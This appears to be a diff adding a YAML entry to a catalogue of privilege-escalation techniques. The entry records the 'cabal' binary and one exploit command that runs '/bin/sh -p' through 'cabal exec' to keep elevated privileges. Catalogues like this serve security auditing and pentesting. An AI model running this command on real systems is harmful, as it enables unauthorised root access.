@@ -1,0 +1,4 @@
+name: cabal
+binary_path: /usr/bin/cabal
+exploit_cmds:
+- /usr/bin/cabal exec --project-file=/dev/null -- /bin/sh -p
